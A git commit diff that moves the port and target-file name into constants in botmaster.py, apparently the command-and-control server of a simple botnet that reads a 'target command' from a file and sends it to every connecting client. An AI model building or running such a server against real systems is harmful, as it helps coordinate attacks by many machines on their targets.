7a143280c4e78eea114252e6c20c087115582f31
Anish Sharma <aneeshsharma@outlook.com>
2021-05-01 17:28:28 +0530

    refractoring

--- botmaster.py
+++ botmaster.py
@@ -1,12 +1,15 @@
 import socket
 
+TARGET_FILE = "target.txt"
+MASTER_PORT = 7323
+
 def send_response(message, client):
     data = "{:<256}".format(message)
     client.send(data.encode("utf-8"))
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-server.bind(("0.0.0.0", 7323))
+server.bind(("0.0.0.0", MASTER_PORT))
 
 server.listen(10)
 
@@ -14,7 +17,7 @@ while True:
     (client, address) = server.accept()
 
     try:
-        target_file = open("target.txt", "r")
+        target_file = open(TARGET_FILE, "r")
         target_command = target_file.read()
         target_file.close()
         if len(target_command) >= 0:
